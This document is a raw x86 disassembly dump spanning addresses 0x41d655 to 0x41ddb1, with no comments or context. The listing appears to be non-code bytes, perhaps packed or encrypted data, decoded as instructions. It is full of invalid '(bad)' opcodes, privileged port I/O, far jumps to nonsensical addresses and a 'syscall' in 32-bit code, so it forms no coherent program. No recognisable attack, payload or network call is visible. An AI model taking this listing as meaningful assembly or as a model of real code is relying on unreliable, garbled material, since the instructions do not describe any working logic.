  41d655:	aam    0xbe
  41d657:	cmp    edi,edi
  41d659:	or     BYTE PTR [ecx+0x7c],0x76
  41d65d:	and    al,0x72
  41d65f:	push   ds
  41d660:	cmp    cl,BYTE PTR [edx-0x4d]
  41d663:	push   esi
  41d664:	push   cs
  41d665:	xchg   ecx,eax
  41d666:	or     eax,0xe392a64d
  41d66b:	push   edi
  41d66c:	push   ds
  41d66d:	in     eax,dx
  41d66e:	lods   eax,DWORD PTR ds:[esi]
  41d66f:	stos   BYTE PTR es:[edi],al
  41d670:	data16 daa 
  41d672:	pusha  
  41d673:	in     eax,dx
  41d674:	es shl ah,0x2d
  41d678:	fcomp  QWORD PTR [eax-0x1a6211a7]
  41d67e:	pop    ss
  41d67f:	add    eax,0x7e7d92a1
  41d684:	mov    bh,0x37
  41d686:	or     edx,DWORD PTR ds:[esi-0x38c78bee]
  41d68d:	push   ss
  41d68e:	mov    ecx,0x3797f1c4
  41d693:	xor    eax,0xd6a2b0b2
  41d698:	(bad)  
  41d699:	in     al,0xda
  41d69b:	mov    DWORD PTR [edx],esp
  41d69d:	inc    eax
  41d69e:	or     eax,0xd5f22c1b
  41d6a3:	mov    al,ds:0x969cc736
  41d6a8:	rcl    BYTE PTR [esi+ebx*2],cl
  41d6ab:	push   edx
  41d6ac:	pusha  
  41d6ad:	jb     0x41d694
  41d6af:	pop    edx
  41d6b0:	fisubr DWORD PTR [edi+0x5c]
  41d6b3:	in     eax,dx
  41d6b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6b5:	sub    BYTE PTR ds:0x7f2ddba3,dh
  41d6bb:	push   ds
  41d6bc:	test   BYTE PTR [edi-0x29],al
  41d6bf:	xchg   edi,eax
  41d6c0:	mov    dh,bl
  41d6c2:	jmp    0x39d1ecee
  41d6c7:	jo     0x41d700
  41d6c9:	loopne 0x41d697
  41d6cb:	xor    al,0x4b
  41d6cd:	adc    BYTE PTR [ebx],al
  41d6cf:	adc    cl,BYTE PTR [ecx]
  41d6d1:	popa   
  41d6d2:	or     al,0x97
  41d6d4:	hlt    
  41d6d5:	dec    esp
  41d6d6:	test   al,0x36
  41d6d8:	adc    eax,0x2f1874c9
  41d6dd:	jo     0x41d65f
  41d6df:	stos   BYTE PTR es:[edi],al
  41d6e0:	clc    
  41d6e1:	mov    ah,0x98
  41d6e3:	mov    WORD PTR [ebp+0x69],ss
  41d6e6:	ja     0x41d6c8
  41d6e8:	lods   eax,DWORD PTR ds:[esi]
  41d6e9:	mov    DWORD PTR [edx-0x25],ecx
  41d6ec:	xor    al,0xad
  41d6ee:	cmp    eax,0xe086a6fe
  41d6f3:	xor    al,0x94
  41d6f5:	inc    DWORD PTR [ecx+0x6d]
  41d6f8:	sbb    eax,0xdc0ff021
  41d6fd:	push   edx
  41d6fe:	xor    esi,esp
  41d700:	fiadd  DWORD PTR [ebx+0x2c]
  41d703:	mov    al,0xc3
  41d705:	fsubr  QWORD PTR [ebx-0x3c]
  41d708:	push   0xffffffe6
  41d70a:	test   DWORD PTR [ebx-0x1d9a0b12],esp
  41d710:	push   esp
  41d711:	xor    DWORD PTR [ebx-0x5fea0298],ecx
  41d717:	inc    ebx
  41d718:	mov    esi,?
  41d71a:	sbb    cl,BYTE PTR [edx+0x154f29c9]
  41d720:	(bad)  
  41d721:	jmp    0x41d760
  41d723:	imul   esi,DWORD PTR [eax],0x6c0840de
  41d729:	mov    dl,0x64
  41d72b:	xchg   ebp,eax
  41d72c:	aas    
  41d72d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d72e:	inc    DWORD PTR [ecx+0x36f6e8b3]
  41d734:	pusha  
  41d735:	jl     0x41d77d
  41d737:	pop    es
  41d738:	hlt    
  41d739:	popa   
  41d73a:	test   DWORD PTR [edi+0x35bcafc7],esi
  41d740:	xchg   ebx,eax
  41d741:	pop    ecx
  41d742:	bound  esi,QWORD PTR [ecx+0x1c4c874e]
  41d748:	shr    BYTE PTR [ebx-0x47bf51f1],0xc0
  41d74f:	pop    eax
  41d750:	in     eax,0x2f
  41d752:	in     eax,0x96
  41d754:	jl     0x41d6e0
  41d756:	ret    
  41d757:	syscall 
  41d759:	push   es
  41d75a:	ins    BYTE PTR es:[edi],dx
  41d75b:	lahf   
  41d75c:	xchg   ah,dh
  41d75e:	dec    esp
  41d75f:	pop    ds
  41d760:	and    edx,ebx
  41d762:	iret   
  41d763:	inc    ecx
  41d764:	retf   0xd5ed
  41d767:	mov    dl,0x78
  41d769:	lahf   
  41d76a:	xlat   BYTE PTR ds:[ebx]
  41d76b:	pop    ebx
  41d76c:	popa   
  41d76d:	in     al,dx
  41d76e:	xlat   BYTE PTR ds:[ebx]
  41d76f:	(bad)  
  41d770:	(bad)  [ecx+0x7d]
  41d773:	adc    DWORD PTR [edi-0x5446149],ecx
  41d779:	inc    ebp
  41d77a:	xchg   edi,eax
  41d77b:	pop    eax
  41d77c:	and    al,0x2d
  41d77e:	call   0x24de8d31
  41d783:	xchg   ebx,eax
  41d784:	hlt    
  41d785:	sbb    eax,0x88b8c2b6
  41d78a:	and    ah,0x54
  41d78d:	stc    
  41d78e:	fwait
  41d78f:	mov    ah,0x7e
  41d791:	mov    DWORD PTR [edx-0x2],ebp
  41d794:	push   0x757a19d3
  41d799:	(bad)  [esi+0x3a]
  41d79c:	dec    edx
  41d79d:	sbb    DWORD PTR [esi-0x1d],edx
  41d7a0:	xchg   ebp,eax
  41d7a1:	les    edi,FWORD PTR [edi]
  41d7a3:	xlat   BYTE PTR ds:[ebx]
  41d7a4:	in     al,0x3e
  41d7a6:	mov    ah,0xee
  41d7a8:	ins    DWORD PTR es:[edi],dx
  41d7a9:	dec    edi
  41d7aa:	jns    0x8b674ae1
  41d7b0:	or     al,0xeb
  41d7b2:	je     0x41d7a7
  41d7b4:	xchg   DWORD PTR [ebx-0x1e55f05a],edx
  41d7ba:	sbb    eax,0xc26fbc46
  41d7bf:	xchg   ebp,eax
  41d7c0:	clc    
  41d7c1:	sbb    al,BYTE PTR ds:[edx-0x6c]
  41d7c5:	pop    ebp
  41d7c6:	mov    ds:0xa017f96,al
  41d7cb:	aad    0xe3
  41d7cd:	jmp    0x41d757
  41d7cf:	jmp    0x41d7c1
  41d7d1:	push   ebx
  41d7d2:	or     eax,0x61c5c1d4
  41d7d7:	push   esp
  41d7d8:	pop    ecx
  41d7d9:	iret   
  41d7da:	aad    0xd7
  41d7dc:	and    eax,0x99538cb4
  41d7e1:	(bad)  
  41d7e2:	jno    0x41d800
  41d7e4:	push   esi
  41d7e5:	add    eax,0xe78bf174
  41d7ea:	mov    cl,0xa6
  41d7ec:	imul   esi,DWORD PTR [eax+0x1f],0xcc0f4f25
  41d7f3:	in     eax,dx
  41d7f4:	stos   BYTE PTR es:[edi],al
  41d7f5:	je     0x41d7c8
  41d7f7:	mov    bh,0x56
  41d7f9:	cdq    
  41d7fa:	pushf  
  41d7fb:	arpl   WORD PTR [ebp-0x15],di
  41d7fe:	sub    eax,0xd8e846c
  41d803:	mov    edx,0x7a71c01
  41d808:	iret   
  41d809:	or     eax,0xad0b1680
  41d80e:	fbld   TBYTE PTR [ecx]
  41d810:	adc    ecx,DWORD PTR [ebp-0x7f27dc9]
  41d816:	xor    al,BYTE PTR [eax]
  41d818:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d819:	adc    dl,BYTE PTR [eax+esi*1]
  41d81c:	mov    edi,0x9b149d16
  41d821:	mov    WORD PTR [esi-0x25e5893d],gs
  41d827:	out    dx,eax
  41d828:	in     eax,dx
  41d829:	jo     0x41d836
  41d82b:	push   ds
  41d82c:	daa    
  41d82d:	sbb    BYTE PTR [ecx-0x2c],al
  41d830:	fstp   QWORD PTR [edi+0x46c90220]
  41d836:	out    dx,al
  41d837:	cmp    eax,0x872b1d57
  41d83c:	in     al,dx
  41d83d:	out    0xb2,al
  41d83f:	stos   BYTE PTR es:[edi],al
  41d840:	pop    edi
  41d841:	jae    0x41d866
  41d843:	sti    
  41d844:	dec    eax
  41d845:	ror    BYTE PTR [edx],0x7c
  41d848:	call   0x2cc2:0xfe8d1f4d
  41d84f:	fistp  QWORD PTR [ebx-0x21b2e4]
  41d855:	pop    esp
  41d856:	scas   eax,DWORD PTR es:[edi]
  41d857:	clc    
  41d858:	sbb    eax,0x6d98224a
  41d85d:	clc    
  41d85e:	cdq    
  41d85f:	xchg   esi,eax
  41d860:	ins    DWORD PTR es:[edi],dx
  41d861:	sbb    cl,BYTE PTR [ecx+0x7544373f]
  41d867:	jmp    0x8d8b0eb1
  41d86c:	inc    eax
  41d86d:	stc    
  41d86e:	ins    DWORD PTR es:[edi],dx
  41d86f:	mov    bl,0x1
  41d871:	and    BYTE PTR [ecx-0x6291f038],cl
  41d877:	mov    cl,0xb7
  41d879:	sbb    BYTE PTR [ebp+0x3e8354e2],0xa0
  41d880:	add    eax,0xf142c5a7
  41d885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d886:	or     eax,0x85d75497
  41d88b:	stc    
  41d88c:	call   0x54837886
  41d891:	js     0x50b47ff7
  41d897:	jmp    0x1971:0xa3b0719c
  41d89e:	mov    dh,0x98
  41d8a0:	out    0xf5,eax
  41d8a2:	mov    dl,0x74
  41d8a4:	outs   dx,DWORD PTR ds:[esi]
  41d8a5:	imul   DWORD PTR [edi+0xd]
  41d8a8:	lods   al,BYTE PTR ds:[esi]
  41d8a9:	mov    ds:0xcc27350f,al
  41d8ae:	into   
  41d8af:	push   edi
  41d8b0:	sar    DWORD PTR [ebx],0x33
  41d8b3:	sbb    DWORD PTR [edx+0x3b051083],ebp
  41d8b9:	loop   0x41d85b
  41d8bb:	in     eax,dx
  41d8bc:	call   0x140d:0xdd7949d1
  41d8c3:	or     bh,bh
  41d8c5:	test   DWORD PTR [eax],esp
  41d8c7:	pop    ebp
  41d8c8:	xlat   BYTE PTR ds:[ebx]
  41d8c9:	mov    dl,0x1
  41d8cb:	mov    esp,0xb9e69e03
  41d8d0:	cmp    ch,bh
  41d8d2:	mov    BYTE PTR [ecx-0x63],dh
  41d8d5:	aam    0xf5
  41d8d7:	jmp    0xe7f3:0x718a8325
  41d8de:	add    eax,0xd3ee9466
  41d8e3:	mov    eax,DWORD PTR [esi+0x5f]
  41d8e6:	and    cl,bh
  41d8e8:	(bad)  
  41d8e9:	mov    ecx,0x257e3652
  41d8ee:	(bad)  
  41d8ef:	fstp   QWORD PTR [ebp+0x2960694b]
  41d8f5:	xlat   BYTE PTR ds:[ebx]
  41d8f6:	and    edx,ebp
  41d8f8:	sbb    esp,DWORD PTR [ecx+0x7b417cef]
  41d8fe:	js     0x41d8f6
  41d900:	retf   
  41d901:	inc    ebp
  41d902:	es pop edx
  41d904:	ror    BYTE PTR [edi+0x4c],1
  41d907:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d908:	rcl    BYTE PTR [ebx],1
  41d90a:	cs cmp al,0x1a
  41d90d:	shl    al,1
  41d90f:	dec    ecx
  41d910:	(bad)
  41d914:	xor    ebp,ebp
  41d916:	addr16 (bad) 
  41d919:	enter  0x45cc,0x17
  41d91d:	rol    DWORD PTR [edi],cl
  41d91f:	fist   DWORD PTR [edx]
  41d921:	jle    0x41d959
  41d923:	(bad)  
  41d924:	clc    
  41d925:	cmp    eax,0x3afb0de9
  41d92a:	push   ebx
  41d92b:	jecxz  0x41d98b
  41d92d:	jo     0x41d930
  41d92f:	daa    
  41d930:	push   cs
  41d931:	cmp    ebx,DWORD PTR [esi-0x4c61e58f]
  41d937:	and    eax,ebp
  41d939:	xchg   esi,eax
  41d93a:	call   0x4bf03635
  41d93f:	lods   eax,DWORD PTR ds:[esi]
  41d940:	mov    esp,0xcfa44d5
  41d945:	jecxz  0x41d90b
  41d947:	dec    ecx
  41d948:	jge    0x41d945
  41d94a:	mov    cl,0xd6
  41d94c:	fld    TBYTE PTR es:0x70f3cdbc
  41d953:	mov    cl,BYTE PTR [ebx-0x7a]
  41d956:	neg    BYTE PTR [edi]
  41d958:	in     eax,dx
  41d959:	or     al,0x38
  41d95b:	pop    ebx
  41d95c:	in     al,0x89
  41d95e:	loopne 0x41d91f
  41d960:	xor    BYTE PTR [esi],bl
  41d962:	fnstsw WORD PTR [edi]
  41d964:	dec    edx
  41d965:	retf   
  41d966:	fld    TBYTE PTR [ebx]
  41d968:	mov    ah,0x26
  41d96a:	mov    WORD PTR [esi+edx*8],?
  41d96d:	inc    ebp
  41d96e:	retf   0xb8e9
  41d971:	mov    dl,0x49
  41d973:	std    
  41d974:	xor    eax,0xf9a65c69
  41d979:	mov    ebp,0x99fa2ea2
  41d97e:	mov    DWORD PTR [ecx-0x15d0d96f],ebx
  41d984:	mov    edi,DWORD PTR [edx+ebp*4+0x759eedf1]
  41d98b:	int    0xce
  41d98d:	fsubr  QWORD PTR [edi]
  41d98f:	ins    DWORD PTR es:[edi],dx
  41d990:	or     ecx,edx
  41d992:	sar    bl,cl
  41d994:	out    dx,al
  41d995:	test   bh,0x20
  41d998:	ret    0x6cb9
  41d99b:	sbb    DWORD PTR [edi-0x4e259148],esp
  41d9a1:	dec    ecx
  41d9a2:	ss stos BYTE PTR es:[edi],al
  41d9a4:	add    eax,eax
  41d9a6:	mov    esp,esp
  41d9a8:	rol    esi,cl
  41d9aa:	sbb    BYTE PTR [edx],cl
  41d9ac:	mov    edi,0xdd2506e0
  41d9b1:	stc    
  41d9b2:	mov    BYTE PTR [edx+ebp*4],ah
  41d9b5:	and    BYTE PTR [ecx],cl
  41d9b7:	cmp    al,0x81
  41d9b9:	cmp    BYTE PTR ds:0x28de3c19,0xe4
  41d9c0:	fild   WORD PTR [edx]
  41d9c2:	retf   0x2b07
  41d9c5:	jae    0x41d9cc
  41d9c7:	pop    eax
  41d9c8:	call   0x9f79dbba
  41d9cd:	cmp    eax,0x2397c00c
  41d9d2:	pop    es
  41d9d3:	in     al,dx
  41d9d4:	cli    
  41d9d5:	sbb    DWORD PTR [ecx+0x10e0d6c2],edx
  41d9db:	inc    edx
  41d9dc:	and    cl,BYTE PTR [edi]
  41d9de:	ds out dx,al
  41d9e0:	xchg   edi,eax
  41d9e1:	cmp    DWORD PTR [eax],ecx
  41d9e3:	sti    
  41d9e4:	pusha  
  41d9e5:	pop    ds
  41d9e6:	mov    ebp,0xe9e7b3d6
  41d9eb:	std    
  41d9ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9ed:	sub    al,BYTE PTR [ecx+0x60]
  41d9f0:	sbb    bx,WORD PTR [edx-0x2d]
  41d9f4:	stc    
  41d9f5:	mov    ch,bh
  41d9f7:	inc    eax
  41d9f8:	xor    al,0x4d
  41d9fa:	mov    edi,0x5b971210
  41d9ff:	test   cl,dl
  41da01:	mov    esi,0x8905cddf
  41da06:	mov    dl,0xf8
  41da08:	sub    al,dh
  41da0a:	xlat   BYTE PTR cs:[ebx]
  41da0c:	ret    0x3faa
  41da0f:	imul   ecx,DWORD PTR [ecx],0x7111261b
  41da15:	div    DWORD PTR [ecx]
  41da17:	stos   DWORD PTR es:[edi],eax
  41da18:	sbb    al,0x26
  41da1a:	ja     0x41d9b2
  41da1c:	popa   
  41da1d:	icebp  
  41da1e:	in     eax,0x22
  41da20:	jle    0x41da5e
  41da22:	add    dh,bl
  41da24:	add    edi,edi
  41da26:	jbe    0x41da24
  41da28:	and    BYTE PTR [ebx-0x7b1f2904],ah
  41da2e:	pop    esp
  41da2f:	cmp    DWORD PTR [esi-0x684b954d],0xbbb2d7ca
  41da39:	test   DWORD PTR [ebp-0x17],0x216aaac8
  41da40:	sbb    ch,BYTE PTR [eax]
  41da42:	data16 cmp ch,ch
  41da45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da46:	fcmovb st,st(4)
  41da48:	mov    esi,0xd33fc71b
  41da4d:	sbb    al,0x79
  41da4f:	loop   0x41da25
  41da51:	inc    esi
  41da52:	dec    esp
  41da53:	mov    ch,0xaf
  41da55:	out    dx,al
  41da56:	sub    al,0x8b
  41da58:	push   edi
  41da59:	xchg   edx,eax
  41da5a:	and    al,0x1a
  41da5c:	pushf  
  41da5d:	cwde   
  41da5e:	or     BYTE PTR ds:0x6d792604,0xfe
  41da65:	sub    DWORD PTR [ecx],ebp
  41da67:	(bad)  
  41da68:	daa    
  41da69:	pop    eax
  41da6a:	aam    0x8b
  41da6c:	call   0xe84c482
  41da71:	adc    bh,al
  41da73:	dec    ecx
  41da74:	pop    ebx
  41da75:	or     eax,0x798088ce
  41da7a:	xor    edx,DWORD PTR [edx]
  41da7c:	push   ebp
  41da7d:	adc    ah,BYTE PTR [edi-0x46]
  41da80:	mov    ch,0xe7
  41da82:	or     bh,BYTE PTR [edx]
  41da84:	and    al,0xe9
  41da86:	mov    eax,0x12982809
  41da8b:	std    
  41da8c:	daa    
  41da8d:	xchg   ebp,eax
  41da8e:	cmp    eax,DWORD PTR [eax+edi*8-0x76]
  41da92:	push   ebp
  41da93:	(bad)  
  41da95:	pusha  
  41da96:	sbb    eax,0x767b199d
  41da9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da9c:	mov    ebp,0x157cc7e7
  41daa1:	inc    ebp
  41daa2:	aas    
  41daa3:	pop    edi
  41daa4:	les    edi,FWORD PTR [eax-0x4c8557e8]
  41daaa:	mov    esi,0x8ed05673
  41daaf:	loope  0x41da32
  41dab1:	push   ebp
  41dab2:	lock pop ebp
  41dab4:	cmc    
  41dab5:	into   
  41dab6:	cmp    cl,cl
  41dab8:	mov    al,0x25
  41daba:	cmc    
  41dabb:	aam    0x93
  41dabd:	lock es sub DWORD PTR es:[eax+0x79bfcb41],esp
  41dac6:	out    dx,eax
  41dac7:	jge    0x41db38
  41dac9:	fcom   st(5)
  41dacb:	mov    ch,0x5f
  41dacd:	loop   0x41da8b
  41dacf:	cmp    DWORD PTR [eax],eax
  41dad1:	not    DWORD PTR [edx-0x3e786b81]
  41dad7:	and    al,0x27
  41dad9:	das    
  41dada:	sbb    eax,0x94fdfecc
  41dadf:	sub    dl,dh
  41dae1:	cmc    
  41dae2:	shl    esp,1
  41dae4:	mov    al,ds:0xa94824bb
  41dae9:	sti    
  41daea:	cs scas al,BYTE PTR es:[edi]
  41daec:	aas    
  41daed:	jle    0x41db41
  41daef:	mov    ah,0xf4
  41daf1:	xor    al,0xda
  41daf3:	push   ecx
  41daf4:	sub    eax,0x5990cf3c
  41daf9:	dec    edx
  41dafa:	cmp    eax,0x9df15a61
  41daff:	loopne 0x41db6f
  41db01:	(bad)
  41db04:	fidivr DWORD PTR [ebx]
  41db06:	inc    ecx
  41db07:	sub    ch,BYTE PTR [esi]
  41db09:	cmp    eax,0x52f87114
  41db0e:	pop    eax
  41db0f:	dec    edi
  41db10:	bound  esp,QWORD PTR [edx]
  41db12:	loop   0x41db17
  41db14:	std    
  41db15:	and    eax,edi
  41db17:	or     ecx,edi
  41db19:	es sbb al,0xb0
  41db1c:	inc    edx
  41db1d:	xlat   BYTE PTR ds:[ebx]
  41db1e:	push   edx
  41db1f:	adc    ecx,DWORD PTR [ebx+0x57]
  41db22:	mov    DWORD PTR [esi+0xe76f39d],ebx
  41db28:	xchg   dh,ch
  41db2a:	int3   
  41db2b:	dec    esi
  41db2c:	repz out dx,eax
  41db2e:	jmp    0x41dade
  41db30:	popf   
  41db31:	jnp    0x41dba1
  41db33:	adc    al,0xbf
  41db35:	sub    BYTE PTR [edi+0x21],0x64
  41db39:	dec    edx
  41db3a:	lea    esp,[ecx+ebx*2-0x489d98a4]
  41db41:	and    bl,BYTE PTR [edx-0x65]
  41db44:	or     eax,0xd3bbfd69
  41db49:	lock push eax
  41db4b:	lahf   
  41db4c:	mov    bh,bh
  41db4e:	add    esi,DWORD PTR [ebp+0x1bbbf187]
  41db54:	push   ecx
  41db55:	push   ebp
  41db56:	add    DWORD PTR [esp+esi*8+0x2c],edi
  41db5a:	call   0x3630:0x1bde2ec7
  41db61:	loope  0x41dbe1
  41db63:	(bad)  
  41db65:	jno    0x41dba4
  41db67:	fwait
  41db68:	pop    esi
  41db69:	sbb    BYTE PTR [eax-0x1d13ba9e],ah
  41db6f:	or     BYTE PTR [edi+eax*1-0x1],dl
  41db73:	dec    ecx
  41db74:	shr    DWORD PTR [esi],0xc0
  41db77:	jmp    0x4501e43c
  41db7c:	mov    dh,0x76
  41db7e:	pop    ss
  41db7f:	mov    al,0xd8
  41db81:	push   edi
  41db82:	pop    esi
  41db83:	lea    ecx,[edx+0x4a]
  41db86:	mov    cl,0x70
  41db88:	jns    0x41dbaf
  41db8a:	add    BYTE PTR [edx+0x38],al
  41db8d:	in     eax,dx
  41db8e:	fdiv   QWORD PTR [edx]
  41db90:	repnz dec edx
  41db92:	jecxz  0x41dbab
  41db94:	and    al,0x27
  41db96:	(bad)  
  41db97:	mov    eax,ds:0xa83d96d2
  41db9c:	xor    al,dl
  41db9e:	cmp    esp,esi
  41dba0:	inc    esi
  41dba1:	jmp    0x41dc14
  41dba3:	jb     0x41dbf7
  41dba5:	fcomp  QWORD PTR [ecx+0x37]
  41dba8:	and    esi,DWORD PTR [ecx]
  41dbaa:	clc    
  41dbab:	pop    ss
  41dbac:	sub    eax,DWORD PTR [edi-0x62]
  41dbaf:	dec    ebp
  41dbb0:	adc    DWORD PTR [ebx+eax*8],esp
  41dbb3:	lahf   
  41dbb4:	sub    DWORD PTR [ecx],ebp
  41dbb6:	imul   BYTE PTR [ebp+ebx*4+0x33]
  41dbba:	xchg   esi,eax
  41dbbb:	add    ah,BYTE PTR [edi-0x43]
  41dbbe:	addr16 ja 0x41dbeb
  41dbc1:	mov    esp,0xed0caa4f
  41dbc6:	mov    ch,0xfe
  41dbc8:	sahf   
  41dbc9:	pop    DWORD PTR [edx]
  41dbcb:	out    dx,al
  41dbcc:	xor    al,0xdf
  41dbce:	and    ch,BYTE PTR [esi-0x9]
  41dbd1:	sbb    eax,0xb17be88
  41dbd6:	pushf  
  41dbd7:	(bad)  
  41dbd8:	scas   al,BYTE PTR es:[edi]
  41dbd9:	adc    esp,DWORD PTR [ecx-0x42]
  41dbdc:	pop    ebx
  41dbdd:	mov    DWORD PTR [eax-0x4362e2a9],ebx
  41dbe3:	jle    0x41dc30
  41dbe5:	or     ebx,DWORD PTR [esi+0x4]
  41dbe8:	push   ss
  41dbe9:	or     DWORD PTR [edi-0x46],0x55
  41dbed:	xchg   ecx,eax
  41dbee:	test   BYTE PTR [ebx+0x36],bl
  41dbf1:	mov    eax,0xe6e180d9
  41dbf6:	jmp    0xa8705fd
  41dbfb:	shl    BYTE PTR [ebp-0x68659f5b],1
  41dc01:	xor    eax,0xec7dc493
  41dc06:	(bad)  
  41dc07:	jo     0x41dbd1
  41dc09:	out    dx,al
  41dc0a:	xor    eax,0xed5cbc4a
  41dc0f:	inc    esi
  41dc10:	fisttp DWORD PTR ds:0x71bd1b76
  41dc16:	pop    ecx
  41dc17:	lahf   
  41dc18:	inc    esp
  41dc19:	sar    bh,cl
  41dc1b:	adc    ch,BYTE PTR [eax]
  41dc1d:	pop    ecx
  41dc1e:	sub    bl,BYTE PTR ss:[edi+0x3cdff022]
  41dc25:	ss pop edi
  41dc27:	pop    es
  41dc28:	adc    BYTE PTR [eax+0x33cfff42],al
  41dc2e:	add    BYTE PTR [ecx-0x973fc8e],bl
  41dc34:	retf   0x1172
  41dc37:	shl    ebp,0xa3
  41dc3a:	shl    al,1
  41dc3c:	xor    ah,BYTE PTR [edx+0x1f4a2249]
  41dc42:	jbe    0x41dc55
  41dc44:	mov    cl,0xa5
  41dc46:	mov    edi,0x58aaa2e4
  41dc4b:	inc    ebp
  41dc4c:	aas    
  41dc4d:	repz jle 0x41dc60
  41dc50:	mov    BYTE PTR [eax+0x1593e1ef],bl
  41dc56:	sar    ch,1
  41dc58:	or     esi,esi
  41dc5a:	icebp  
  41dc5b:	loope  0x41dc7c
  41dc5d:	lock fst QWORD PTR [ecx-0x39]
  41dc61:	push   ebp
  41dc62:	push   es
  41dc63:	test   BYTE PTR [esi+ebp*2+0x3ee21337],cl
  41dc6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc6b:	cmc    
  41dc6c:	inc    ebx
  41dc6d:	(bad)  
  41dc6e:	sub    BYTE PTR [edi+ecx*1-0xc],dh
  41dc72:	std    
  41dc73:	pop    ebx
  41dc74:	fcomp  QWORD PTR [ebx-0x52]
  41dc77:	cmc    
  41dc78:	cmp    al,0xcd
  41dc7a:	ds pop es
  41dc7c:	xchg   ebx,eax
  41dc7d:	push   esi
  41dc7e:	pop    ss
  41dc7f:	mov    bh,0x7b
  41dc81:	cmp    al,0x79
  41dc83:	push   es
  41dc84:	xchg   edi,eax
  41dc85:	ret    0x3e92
  41dc88:	fdiv   st,st(7)
  41dc8a:	into   
  41dc8b:	mov    ebx,DWORD PTR [edi+0x21]
  41dc8e:	pop    esp
  41dc8f:	pop    ebx
  41dc90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc91:	or     al,BYTE PTR [ebp+ecx*8-0x33]
  41dc95:	mov    eax,ds:0xb4c92988
  41dc9a:	iret   
  41dc9b:	leave  
  41dc9c:	pusha  
  41dc9d:	push   edi
  41dc9e:	jmp    0xe0827a79
  41dca3:	cmp    al,0x36
  41dca5:	mov    bl,0x60
  41dca7:	mov    esi,ebp
  41dca9:	xchg   edx,eax
  41dcaa:	rol    edi,cl
  41dcac:	xchg   esp,eax
  41dcad:	je     0x41dc4d
  41dcaf:	sbb    DWORD PTR [esp+edx*1-0x20ce55af],eax
  41dcb6:	popf   
  41dcb7:	push   ss
  41dcb8:	aaa    
  41dcb9:	xchg   edx,eax
  41dcba:	out    0x17,eax
  41dcbc:	or     eax,0x88a8cab3
  41dcc1:	sbb    eax,0x84f754ce
  41dcc6:	add    eax,eax
  41dcc8:	sbb    BYTE PTR [esi+0x0],bl
  41dccb:	mov    bh,0x6c
  41dccd:	ss out 0x9f,ax
  41dcd1:	xchg   DWORD PTR [edi-0x13],ebx
  41dcd4:	jmp    0x41dcb8
  41dcd6:	cmp    DWORD PTR [edi+ebp*1+0x59],0xffffffaa
  41dcdb:	in     eax,0x7f
  41dcdd:	jmp    0x167e:0x59cb790e
  41dce4:	sub    al,0xd7
  41dce6:	pop    es
  41dce7:	or     dl,BYTE PTR ds:0xfd3e470e
  41dced:	sbb    BYTE PTR [edx-0x458e6177],ch
  41dcf3:	mov    ecx,fs
  41dcf5:	loope  0x41dd25
  41dcf7:	mov    esi,0x191289d
  41dcfc:	and    BYTE PTR [ebx],al
  41dcfe:	sbb    ch,dh
  41dd00:	or     cl,ah
  41dd02:	xchg   esp,eax
  41dd03:	icebp  
  41dd04:	call   0x4e15703b
  41dd09:	adc    cl,0x1d
  41dd0c:	push   ecx
  41dd0d:	sti    
  41dd0e:	xor    DWORD PTR [ebx-0x13],esp
  41dd11:	retf   
  41dd12:	pop    ecx
  41dd13:	mov    bl,0xcc
  41dd15:	pop    ebx
  41dd16:	sub    al,0x56
  41dd18:	adc    eax,0x8a316bd1
  41dd1d:	popa   
  41dd1e:	test   al,0xd3
  41dd20:	cmp    DWORD PTR [esi+0x4b7fc238],ecx
  41dd26:	out    0xbd,al
  41dd28:	or     esp,DWORD PTR [esi+0x2b]
  41dd2b:	lock dec esi
  41dd2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd2e:	xor    al,0x4b
  41dd30:	adc    al,0xdd
  41dd32:	arpl   WORD PTR ds:[esi-0x26],ax
  41dd36:	lahf   
  41dd37:	dec    edi
  41dd38:	imul   edi,DWORD PTR [esi+0x5264d4],0x36
  41dd3f:	sbb    edi,DWORD PTR [edx-0x3d]
  41dd42:	imul   ebp,DWORD PTR ds:0x1b724421,0x23a9d25e
  41dd4c:	mov    ecx,DWORD PTR [ebx+0x5e]
  41dd4f:	sub    ebp,eax
  41dd51:	jnp    0x41dd49
  41dd53:	xchg   ebp,eax
  41dd54:	cmp    dh,BYTE PTR [ebx+edi*1-0x1e5af872]
  41dd5b:	or     eax,0x3d7c1e7c
  41dd60:	and    ebp,ebx
  41dd62:	dec    esi
  41dd63:	sub    eax,DWORD PTR [edi+0x62]
  41dd66:	out    dx,al
  41dd67:	inc    ebp
  41dd68:	dec    ebp
  41dd69:	(bad)  
  41dd6b:	mov    esi,0x50652f5c
  41dd70:	ja     0x41dd84
  41dd72:	mov    ds:0x80409b3d,al
  41dd77:	leave  
  41dd78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd79:	test   al,0x95
  41dd7b:	mov    bl,0x26
  41dd7d:	cmp    BYTE PTR [ecx-0xc],bh
  41dd80:	jge    0x41dd66
  41dd82:	lods   al,BYTE PTR ds:[esi]
  41dd83:	into   
  41dd84:	inc    esi
  41dd85:	(bad)  
  41dd86:	outs   dx,BYTE PTR ds:[esi]
  41dd87:	stos   DWORD PTR es:[edi],eax
  41dd88:	clc    
  41dd89:	pusha  
  41dd8a:	into   
  41dd8b:	dec    edx
  41dd8c:	mov    DWORD PTR [eax+0x61],ecx
  41dd8f:	lods   al,BYTE PTR ds:[esi]
  41dd90:	cmc    
  41dd91:	das    
  41dd92:	or     al,0xe6
  41dd94:	cmc    
  41dd95:	xchg   ebp,eax
  41dd96:	test   BYTE PTR [esi-0x4b],bl
  41dd99:	test   al,0x30
  41dd9b:	mov    cl,0x44
  41dd9d:	sbb    ebx,DWORD PTR [esi+0x4d]
  41dda0:	les    ebx,FWORD PTR [esi]
  41dda2:	cld    
  41dda3:	jne    0x41dd57
  41dda5:	shl    BYTE PTR [edi],0x78
  41dda8:	jne    0x41ddaa
  41ddaa:	ror    DWORD PTR [eax+0x796bab48],0xf6
  41ddb1:	aad    0x25
